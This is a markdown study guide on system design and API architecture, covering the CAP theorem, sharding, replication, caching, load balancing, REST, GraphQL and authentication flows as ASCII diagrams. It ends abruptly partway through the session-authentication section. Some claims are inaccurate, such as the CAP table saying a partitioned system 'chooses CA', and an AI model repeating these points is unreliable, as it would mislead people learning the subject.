# Comprehensive System Design & API Architecture Guide

## Table of Contents
1. [CAP Theorem & Database Selection](#cap-theorem--database-selection)
2. [Database Architectures & Scaling](#database-architectures--scaling)
3. [Caching Strategies & Invalidation](#caching-strategies--invalidation)
4. [Load Balancing & High Availability](#load-balancing--high-availability)
5. [API Design Patterns & Protocols](#api-design-patterns--protocols)
6. [RESTful API Design](#restful-api-design)
7. [GraphQL API Design](#graphql-api-design)
8. [Authentication Methods](#authentication-methods)
9. [Authorization Frameworks](#authorization-frameworks)
10. [API Security Best Practices](#api-security-best-practices)

---

## CAP Theorem & Database Selection

### CAP Theorem Explained

```
          Consistency
          /        \
         /          \
        /            \
Availability -------- Partition Tolerance
```

**The Trade-offs:**

| Scenario | What Happens | When It Works | When It Fails | Recovery Strategy |
|----------|-------------|---------------|---------------|-------------------|
| **Network Partition** | Nodes can't communicate | System chooses CA | Data inconsistency or downtime | Implement circuit breakers, retry with backoff |
| **Write Conflict** | Two nodes get different writes | System resolves via consensus | Data divergence | Use version vectors or CRDTs |
| **Node Failure** | One node goes down | System continues | Loss of availability | Auto-failover, replication |

### SQL vs NoSQL Decision Matrix

**5 Questions to Choose Your Database:**

1. **Access Pattern**: Read-heavy → Cache/Replica | Write-heavy → Sharding
2. **Consistency Need**: Payment/Traffic → ACID SQL | Analytics → NoSQL
3. **Failure Mode**: Can you handle stale reads? → NoSQL | Need exact? → SQL
4. **Operational Cost**: Complex vs Simple solutions
5. **10x Traffic**: Will it scale? What breaks first?

### Database Types & Use Cases

```
┌─────────────────────────────────────────────────────────────────┐
│                        DATABASE TYPES                          │
├───────────────┬──────────────────┬─────────────────────────────┤
│ Type          │ Examples         │ Best For                    │
├───────────────┼──────────────────┼─────────────────────────────┤
│ Document      │ MongoDB          │ JSON data, flexible schema  │
│ Wide-Column   │ CosmosDB         │ Time-series, IoT data       │
│ Key-Value     │ Redis            │ Caching, Sessions           │
│ Graph         │ Neo4j            │ Relationships, Social graphs│
│ Search Engine │ Elasticsearch    │ Full-text search, logs      │
│ OLAP          │ BigQuery         │ Analytics, BI               │
│ Row Store     │ PostgreSQL       │ Transactional workloads     │
└───────────────┴──────────────────┴─────────────────────────────┘
```

### Elastic Search: When & Why

```
┌─────────────────────────────────────────────────────────────────┐
│                    SEARCH ARCHITECTURE                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  User Query: "LIKE '%middle_trailing_wilcard%'"               │
│                    │                                            │
│                    ▼                                            │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Problem: RDBMS B-Tree CAN'T optimize wildcard       │      │
│  │  Solution: Fallback to full table scan              │      │
│  │  Result: SLOW on large datasets                     │      │
│  └──────────────────────────────────────────────────────┘      │
│                    │                                            │
│                    ▼                                            │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Move to Elastic Search                             │      │
│  │  - Inverted index for fast search                   │      │
│  │  - Handles partial matches efficiently              │      │
│  └──────────────────────────────────────────────────────┘      │
│                    │                                            │
│  If Elastic Search Fails:                                      │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  1. PG scoped search (fallback)                    │      │
│  │  2. Redis trending items (cached results)          │      │
│  │  3. Fallback to basic exact match search           │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  Advanced Search Types:                                       │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Intent-based: Add Vector DB + fallback PG         │      │
│  │  Relation-based: Add Neo4j entity-relation DB      │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Database Architectures & Scaling

### Scaling Strategies

```
┌─────────────────────────────────────────────────────────────────┐
│                      SCALING STRATEGIES                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  VERTICAL SCALING (Scale Up)                                   │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  One DB Server                                      │      │
│  │  Increase: CPU, RAM, Disk, Network                  │      │
│  │  Limit: Hardware capacity, cost                     │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  HORIZONTAL SCALING (Scale Out)                                │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Sharding (Write-heavy)                             │      │
│  │  Replication (Read-heavy)                           │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Sharding Types & Failure Scenarios

```
┌─────────────────────────────────────────────────────────────────┐
│                      SHARDING TYPES                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. RANGE-BASED SHARDING                                       │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Shard 1: user_id 1-1000                            │      │
│  │  Shard 2: user_id 1001-2000                         │      │
│  │  Shard 3: user_id 2001-3000                         │      │
│  │                                                     │      │
│  │  ✅ Good: Simple, range queries easy               │      │
│  │  ❌ Bad: Hotspots (new users go to last shard)    │      │
│  │  🔧 Recovery: Rebalance, add new shard             │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  2. DIRECTORY-BASED SHARDING                                   │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Lookup Service → Which DB?                         │      │
│  │                                                     │      │
│  │  ✅ Good: Flexible, can remap                       │      │
│  │  ❌ Bad: Lookup is single point of failure         │      │
│  │  🔧 Recovery: Cache lookup, replicate lookup       │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  3. GEOGRAPHY-BASED SHARDING                                   │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  US users → US DB                                   │      │
│  │  EU users → EU DB                                   │      │
│  │  APAC users → APAC DB                               │      │
│  │                                                     │      │
│  │  ✅ Good: Low latency, compliance                   │      │
│  │  ❌ Bad: Cross-region queries complex              │      │
│  │  🔧 Recovery: Cross-region replication             │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Replication Types

```
┌─────────────────────────────────────────────────────────────────┐
│                    REPLICATION TYPES                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  MASTER-SLAVE REPLICATION                                      │
│  ┌──────────────────────────────────────────────────────┐      │
│  │                    Master                           │      │
│  │                   /      \                          │      │
│  │              Read/Write   \                         │      │
│  │                         Replication                 │      │
│  │                    /               \                │      │
│  │              Slave 1            Slave 2             │      │
│  │           (Read Only)        (Read Only)            │      │
│  │                                                     │      │
│  │  ✅ Good: Read scaling, backup                     │      │
│  │  ❌ Bad: Write bottleneck, replication lag         │      │
│  │  🔧 Recovery: Promote slave to master              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  MASTER-MASTER REPLICATION                                     │
│  ┌──────────────────────────────────────────────────────┐      │
│  │         Master 1 ←→ Master 2                        │      │
│  │         (Read/Write)  (Read/Write)                  │      │
│  │                                                     │      │
│  │  ✅ Good: High availability, write scaling         │      │
│  │  ❌ Bad: Conflict resolution, complexity           │      │
│  │  🔧 Recovery: Conflict resolution strategies       │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Database Performance Optimization

```
┌─────────────────────────────────────────────────────────────────┐
│                 PERFORMANCE OPTIMIZATION                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CACHING                                                       │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Redis/Memcached for frequent queries             │      │
│  │  - Cache invalidation strategies                    │      │
│  │  - When cache fails: DB fallback + cache warming    │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  INDEXING                                                      │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - B-Tree for equality/range                         │      │
│  │  - Hash for exact lookups                           │      │
│  │  - Covering indexes for faster queries              │      │
│  │  - Watch for: Too many indexes (write overhead)     │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  QUERY OPTIMIZATION                                            │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - EXPLAIN ANALYZE to find bottlenecks              │      │
│  │  - Avoid SELECT * (fetch only needed columns)       │      │
│  │  - Use connection pooling (PG Bouncer)              │      │
│  │  - Keep transaction data and OLAP separate          │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  PG BOUNCER EXAMPLE:                                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  2,500 App Connections                              │      │
│  │         ↓                                           │      │
│  │  PG Bouncer (Connection Pooling)                   │      │
│  │         ↓                                           │      │
│  │  500 Active DB Connections                          │      │
│  │                                                     │      │
│  │  ✅ Saves DB resources, reduces overhead            │      │
│  │  ❌ Connections timeout if pool exhausted           │      │
│  │  🔧 Recovery: Increase pool, add timeout retry     │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Caching Strategies & Invalidation

### Cache Types & Use Cases

```
┌─────────────────────────────────────────────────────────────────┐
│                      CACHE TYPES                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT-SIDE CACHING                                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Browser cache (Cache-Control headers)            │      │
│  │  - Mobile app local storage                         │      │
│  │  ✅ Reduces bandwidth, faster load                  │      │
│  │  ❌ Stale data, cache invalidation issues           │      │
│  │  🔧 Recovery: Use ETag, versioned resources        │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SERVER-SIDE CACHING                                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Redis, Memcached, NGINX                          │      │
│  │  - In-memory caching                                │      │
│  │  ✅ Fast, reduces DB load                           │      │
│  │  ❌ Memory limits, cache churn                     │      │
│  │  🔧 Recovery: TTL, LRU eviction                    │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  CDN (Content Delivery Network)                                │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  1. PULL-BASED: Origin → CDN on first request       │      │
│  │  2. PUSH-BASED: Upload → CDN distribution           │      │
│  │                                                     │      │
│  │  ✅ Global low latency, DDoS protection             │      │
│  │  ❌ Stale content, cost, cache purge delay          │      │
│  │  🔧 Recovery: Purge cache, TTL short for dynamic    │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Cache Invalidation Strategies

```
┌─────────────────────────────────────────────────────────────────┐
│                CACHE INVALIDATION                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  WRITE-THROUGH CACHE                                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  1. Client writes to cache                          │      │
│  │  2. Cache updates DB                                │      │
│  │  3. Success response                                │      │
│  │                                                     │      │
│  │  ✅ Strong consistency                              │      │
│  │  ❌ Slower writes, if DB fails → write fails       │      │
│  │  🔧 Recovery: Queue writes, retry                   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  WRITE-BACK CACHE                                              │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  1. Client writes to cache                          │      │
│  │  2. Success response (fast)                         │      │
│  │  3. Cron/async syncs cache to DB                    │      │
│  │                                                     │      │
│  │  ✅ Fast writes, high throughput                    │      │
│  │  ❌ Data loss if cache fails before sync            │      │
│  │  🔧 Recovery: Write-ahead logs, checkpoint          │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  BUFFER CACHE EVICTION:                                        │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Problem: Heavy analytics query evicts all cached   │      │
│  │           transaction data                          │      │
│  │                                                     │      │
│  │  Solution: Separate OLAP and transaction DB         │      │
│  │  Rule of thumb: ALWAYS keep them separate           │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Cache Failure Recovery

```
┌─────────────────────────────────────────────────────────────────┐
│              CACHE FAILURE RECOVERY                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  When Cache Fails:                                             │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  1. Circuit breaker opens                           │      │
│  │  2. All requests go to DB                           │      │
│  │  3. Monitor DB load                                 │      │
│  │  4. Gradually bring cache back                      │      │
│  │  5. Warm cache with frequent data                   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ⚠️  Cache Stampede Protection:                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Multiple clients rebuild same key                │      │
│  │  - Solution: Use mutex/Redis lock                   │      │
│  │  - Only one client recomputes, others wait          │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Load Balancing & High Availability

### Load Balancing Algorithms

```
┌─────────────────────────────────────────────────────────────────┐
│                LOAD BALANCING ALGORITHMS                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. ROUND ROBIN                                                │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Requests: 1→Server1, 2→Server2, 3→Server3, 4→Server1│      │
│  │  ✅ Simple, works for identical servers              │      │
│  │  ❌ Uneven load if servers differ                    │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  2. LEAST CONNECTION                                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Sends to server with fewest active connections      │      │
│  │  ✅ Handles long-running requests well               │      │
│  │  ❌ Overhead tracking connections                    │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  3. LEAST RESPONSE TIME                                        │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Measures response time, sends to fastest           │      │
│  │  ✅ Self-tuning                                      │      │
│  │  ❌ Variance in response times                       │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  4. IP HASH                                                    │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  hash(client_ip) % server_count → same server always │      │
│  │  ✅ Session persistence                              │      │
│  │  ❌ Uneven distribution, server changes break       │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  5. WEIGHTED ALGOS                                             │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Server1(weight 5) → 5x more traffic than Server2    │      │
│  │  ✅ Handles different server capacities             │      │
│  │  ❌ Manual configuration overhead                    │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  6. CONSISTENT HASHING                                         │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  virtual nodes distributed on hash ring             │      │
│  │  ✅ Minimal rehashing on add/remove                 │      │
│  │  ❌ Complex to implement                            │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Load Balancer Types

```
┌─────────────────────────────────────────────────────────────────┐
│                  LOAD BALANCER TYPES                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SOFTWARE:                                                     │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - NGINX: Reverse proxy, caching, SSL termination    │      │
│  │  - HAproxy: High-performance, L4/L7 balancing        │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  HARDWARE:                                                     │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - F5 BIG-IP: Enterprise, WAF, SSL acceleration      │      │
│  │  - Citrix ADC: Load balancing, compression           │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  CLOUD:                                                        │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Azure Load Balancer: L4 balancing                 │      │
│  │  - AWS ELB: Managed LB with scaling                  │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Single Point of Failure & Recovery

```
┌─────────────────────────────────────────────────────────────────┐
│              SINGLE POINT OF FAILURE                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Architecture:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │                                                      │      │
│  │    Users → LB → Cache → DB                          │      │
│  │             ↑                                        │      │
│  │         SPOF                                         │      │
│  │                                                      │      │
│  │  If LB fails → Entire system goes down              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  Recovery Strategies:                                          │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  1. Redundancy                                      │      │
│  │     → Active-Passive: One LB active, one standby    │      │
│  │     → Active-Active: Both LB balance traffic        │      │
│  │                                                     │      │
│  │  2. Health Check & Self-Healing                     │      │
│  │     → LB pings servers, removes unhealthy           │      │
│  │     → Auto-restart failed services                  │      │
│  │     → Kubernetes handles pod restarts               │      │
│  │                                                     │      │
│  │  3. DNS Failover                                    │      │
│  │     → Multiple IPs in DNS record                    │      │
│  │     → Clients retry next IP on failure              │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## API Design Patterns & Protocols

### Core API Styles Comparison

```
┌─────────────────────────────────────────────────────────────────┐
│                    API STYLES COMPARISON                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌───────────────┬──────────────────┬─────────────────────────┐│
│  │ Feature       │ REST             │ GraphQL    │ gRPC       ││
│  ├───────────────┼──────────────────┼────────────┼────────────┤│
│  │ Protocol      │ HTTP/1.1, HTTP/2  │ HTTP       │ HTTP/2     ││
│  │ Data Format   │ JSON/XML         │ JSON       │ Protobuf   ││
│  │ Over-fetching │ Yes              │ No         │ No         ││
│  │ Caching       │ HTTP cache       │ Complex    │ No         ││
│  │ Tooling       │ Mature           │ Growing    │ Mature     ││
│  │ Learning Curve│ Low              │ Medium     │ High       ││
│  └───────────────┴──────────────────┴────────────┴────────────┘│
│                                                                 │
│  WHEN TO USE:                                                   │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  REST: Public APIs, CRUD, simple resources          │      │
│  │  GraphQL: Complex data requirements, mobile apps    │      │
│  │  gRPC: Microservices, high-performance, streaming   │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Application Protocols

```
┌─────────────────────────────────────────────────────────────────┐
│               APPLICATION LAYER PROTOCOLS                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  HTTPS                                                         │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Secure HTTP with TLS/SSL encryption               │      │
│  │  - Most common for web APIs                         │      │
│  │  ✅ Wide support, firewall-friendly                 │      │
│  │  ❌ Overhead for small messages                     │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  WEBSOCKETS                                                    │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Real-time bidirectional communication             │      │
│  │  - Persistent connection                             │      │
│  │  ✅ Low latency, push notifications                 │      │
│  │  ❌ Connection overhead, scaling complexity         │      │
│  │  🔧 Recovery: Reconnect on drop, keep-alive        │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  MQTT                                                          │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Lightweight IoT messaging                        │      │
│  │  - Pub/sub model                                     │      │
│  │  ✅ Low bandwidth, battery friendly                 │      │
│  │  ❌ QoS levels complexity, binary protocol          │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  gRPC                                                          │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - High-performance RPC                             │      │
│  │  - Protocol Buffers serialization                   │      │
│  │  ✅ Fast, streaming support, typed contracts        │      │
│  │  ❌ Not browser-friendly, binary format             │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### API Design Considerations

```
┌─────────────────────────────────────────────────────────────────┐
│              API DESIGN CHECKLIST                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  WHAT TO CONSIDER:                                              │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  1. API Type: REST/GraphQL/gRPC                     │      │
│  │  2. Communication Protocol: HTTP/WebSocket          │      │
│  │  3. Data Transport: JSON/XML/Protobuf              │      │
│  │  4. Input/Output Validation                         │      │
│  │  5. Naming Conventions                              │      │
│  │  6. Security: Authentication, Rate Limiting         │      │
│  │  7. Sorting, Filtering, Pagination                 │      │
│  │  8. Error Handling                                  │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  API DESIGN APPROACHES:                                        │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Top-Down: High-level design first                  │      │
│  │  Bottom-Up: Existing data model drives              │      │
│  │  Contract-First: Define contract before code        │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  API LIFECYCLE:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Design → Development → Monitor → Maintenance →     │      │
│  │  Deprecation → Retirement                           │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## RESTful API Design

### REST API Structure

```
┌─────────────────────────────────────────────────────────────────┐
│                   REST API PATTERNS                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  RESOURCE NAMING:                                              │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Products:  /api/v1/products                        │      │
│  │  Orders:    /api/v1/orders                          │      │
│  │  Reviews:   /api/v1/products/{id}/reviews           │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  FILTERING, SORTING, PAGINATION:                                │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  GET /products?category=books&inStock=true          │      │
│  │  GET /products?sort=price_asc                       │      │
│  │  GET /products?page=2&limit=3                       │      │
│  │  GET /products?cursor=hash_of_the_page              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  STATUS CODES:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  2xx: Success                                      │      │
│  │    200 OK, 201 Created, 204 No Content              │      │
│  │  3xx: Redirection                                   │      │
│  │    301 Moved, 304 Not Modified                      │      │
│  │  4xx: Client Error                                  │      │
│  │    400 Bad Request, 401 Unauthorized, 404 Not Found │      │
│  │  5xx: Server Error                                  │      │
│  │    500 Internal Server Error, 503 Service Unavailable│     │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## GraphQL API Design

### GraphQL Schema & Queries

```graphql
# SCHEMA DEFINITION
type User {
    id: ID!
    name: String!
    posts: [Post!]!
}

type Post {
    id: ID!
    title: String!
    body: String!
    author: User!
}

type Query {
    user(id: ID!): User
    posts(limit: Int): [Post!]!
}

type Mutation {
    createUser(name: String!): User!
    createPost(title: String!, body: String!): Post!
}
```

### Query Examples

```graphql
# QUERY: Get user with their posts
query {
    user(id: "123") {
        name
        posts {
            title
            body
        }
    }
}

# MUTATION: Create post
mutation {
    createPost(title: "New Post", body: "Hello World!") {
        id
        title
        createdAt
    }
}

# ERROR RESPONSE
{
    "data": { "user": null },
    "errors": [{
        "statusCode": 404,
        "message": "User not found",
        "path": ["user"]
    }]
}
```

### GraphQL Best Practices

```
┌─────────────────────────────────────────────────────────────────┐
│               GRAPHQL BEST PRACTICES                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. N + 1 Problem Prevention                                    │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Use DataLoader for batched DB queries              │      │
│  │  Example: 100 users → 1 query for posts (not 100)   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  2. Complexity Limits                                          │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Set max query depth                               │      │
│  │  - Limit number of fields                            │      │
│  │  - Cost-based analysis                               │      │
│  │  - Reject expensive queries                          │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  3. Caching Strategy                                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Use persisted queries (stored queries)           │      │
│  │  - Hash-based cache keys                            │      │
│  │  - Apollo caching with normalized store              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  4. Security                                                    │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Validate input                                    │      │
│  │  - Rate limiting per query type                     │      │
│  │  - Authentication in resolvers                      │      │
│  │  - Disable introspection in production              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  5. When GraphQL Fails                                         │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Problem: Complex queries overload DB               │      │
│  │  Solution: Cache, pagination, query cost analysis    │      │
│  │                                                     │      │
│  │  Problem: Malicious nested queries                  │      │
│  │  Solution: Depth limiting, timeouts                 │      │
│  │                                                     │      │
│  │  Problem: Exposed internal data                     │      │
│  │  Solution: Field-level authorization                │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Authentication Methods

### Authentication vs Authorization

```
┌─────────────────────────────────────────────────────────────────┐
│              AUTHENTICATION VS AUTHORIZATION                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  AUTHENTICATION: "Who are you?"                                │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Verify identity                                   │      │
│  │  - Login, credentials validation                     │      │
│  │  - Returns: Identity confirmed/rejected              │      │
│  │  - Status: 401 Unauthorized on failure              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  AUTHORIZATION: "What can you do?"                             │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Check permissions                                 │      │
│  │  - Access control, roles, scopes                    │      │
│  │  - Returns: Access granted/denied                    │      │
│  │  - Status: 403 Forbidden on failure                 │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  📌 Common Confusion:                               │      │
│  │  - Authentication method != Authorization framework │      │
│  │  - JWT is token format, not authentication method   │      │
│  │  - OAuth2 is authorization framework, not auth      │      │
│  │  - SSO is UX pattern, not authentication method     │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Basic Authentication Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                  BASIC AUTHENTICATION                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT                    SERVER                               │
│    │                         │                                  │
│    │  GET /api/users        │                                  │
│    │────────────────────────►│                                  │
│    │                         │                                  │
│    │  401 Unauthorized      │                                  │
│    │  WWW-Authenticate: Basic│                                  │
│    │◄────────────────────────│                                  │
│    │                         │                                  │
│    │  Prompt user for       │                                  │
│    │  username/password     │                                  │
│    │                         │                                  │
│    │  GET /api/users        │                                  │
│    │  Authorization: Basic  │                                  │
│    │  dXNlcjpwYXNz          │                                  │
│    │────────────────────────►│                                  │
│    │                         │                                  │
│    │       Verify Credentials│                                  │
│    │                         │                                  │
│    │  ┌────────────────────┐│                                  │
│    │  │  Valid: 200 OK     ││                                  │
│    │  │  Invalid: 401      ││                                  │
│    │  └────────────────────┘│                                  │
│    │◄────────────────────────│                                  │
│                                                                 │
│  ⚠️  DRAWBACKS:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Base64 is easily reversible (not encryption!)     │      │
│  │  - Only secure with HTTPS                           │      │
│  │  - Rarely used in production                        │      │
│  │  - Credentials sent with every request              │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### Digest Authentication

```
┌─────────────────────────────────────────────────────────────────┐
│                  DIGEST AUTHENTICATION                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT                    SERVER                               │
│    │                         │                                  │
│    │  GET /api/users        │                                  │
│    │────────────────────────►│                                  │
│    │                         │                                  │
│    │  401 Unauthorized      │                                  │
│    │  WWW-Authenticate:     │                                  │
│    │  Digest realm="api",   │                                  │
│    │  nonce="abc123",       │                                  │
│    │  qop="auth"            │                                  │
│    │◄────────────────────────│                                  │
│    │                         │                                  │
│    │  Compute MD5 hash:     │                                  │
│    │  HA1 = MD5(user:realm:password)                          │
│    │  HA2 = MD5(method:uri)                                   │
│    │  response = MD5(HA1:nonce:HA2)                          │
│    │                         │                                  │
│    │  GET /api/users        │                                  │
│    │  Authorization: Digest │                                  │
│    │  username="user",      │                                  │
│    │  realm="api",          │                                  │
│    │  nonce="abc123",       │                                  │
│    │  response="6629fae..." │                                  │
│    │────────────────────────►│                                  │
│    │                         │                                  │
│    │       Verify Response   │                                  │
│    │                         │                                  │
│    │  ┌────────────────────┐│                                  │
│    │  │  Valid: 200 OK     ││                                  │
│    │  │  Invalid: 401      ││                                  │
│    │  └────────────────────┘│                                  │
│    │◄────────────────────────│                                  │
│                                                                 │
│  ✅ SECURE: Password never sent in clear                       │
│  ❌ COMPLEX: MD5 is considered weak, stateful                  │
└─────────────────────────────────────────────────────────────────┘
```

### API Key Authentication

```
┌─────────────────────────────────────────────────────────────────┐
│                   API KEY AUTHENTICATION                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT/APP                API SERVER          DATABASE        │
│    │                         │                    │             │
│    │  GET /api/users        │                    │             │
│    │  X-API-Key: abc123     │                    │             │
│    │────────────────────────►│                    │             │
│    │                         │                    │             │
│    │                         │  Lookup API key   │             │
│    │                         │───────────────────►│             │
│    │                         │                    │             │
│    │                         │  key_hash, user_id│             │
│    │                         │  scopes, active    │             │
│    │                         │◄───────────────────│             │
│    │                         │                    │             │
│    │       ┌────────────────┴────────────┐       │             │
│    │       │  Valid?                     │       │             │
│    │       │  - Active?                  │       │             │
│    │       │  - Correct scopes?          │       │             │
│    │       └────────────────┬────────────┘       │             │
│    │                         │                    │             │
│    │  ┌────────────────────┐│                    │             │
│    │  │  Valid: 200 OK     ││                    │             │
│    │  │  Invalid: 401      ││                    │             │
│    │  └────────────────────┘│                    │             │
│    │◄────────────────────────│                    │             │
│                                                                 │
│  ✅ Simple, easy to implement                                  │
│  ❌ Hard to manage at scale, no expiration                     │
│  🔧 Recovery: Revoke keys, rate limit per key                  │
└─────────────────────────────────────────────────────────────────┘
```

### Session-Based Authentication

```
┌─────────────────────────────────────────────────────────────────┐
│                 SESSION-BASED AUTHENTICATION                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  USER                  WEB SERVER           SESSION STORE     │
│   │                       │                      │              │
│   │  Login with         │                      │              │
│   │  credentials        │                      │              │
│   │─────────────────────►│                      │              │
│   │                       │                      │              │
